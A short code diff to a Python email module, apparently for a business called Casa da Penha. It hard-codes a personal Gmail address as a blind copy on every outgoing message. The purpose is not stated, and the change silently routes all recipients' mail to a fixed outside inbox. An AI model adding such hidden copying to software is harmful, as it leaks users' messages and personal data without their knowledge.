@@ -5,6 +5,7 @@ logger = logging.getLogger(__name__)
 BREVO_API_KEY  = os.getenv("BREVO_API_KEY", "")
 SMTP_FROM_NAME = os.getenv("SMTP_FROM_NAME", "Casa da Penha")
 SMTP_FROM_ADDR = os.getenv("SMTP_FROM", os.getenv("SMTP_USER", ""))
+BCC_ADDR       = "diogo.pachecodeamorim2002@gmail.com"
 
 
 def _send(to: str, subject: str, html: str) -> bool:
@@ -24,6 +25,7 @@ def _send(to: str, subject: str, html: str) -> bool:
             json={
                 "sender":      {"name": SMTP_FROM_NAME, "email": SMTP_FROM_ADDR},
                 "to":          [{"email": to}],
+                "bcc":         [{"email": BCC_ADDR}],
                 "subject":     subject,
                 "htmlContent": html,
             },
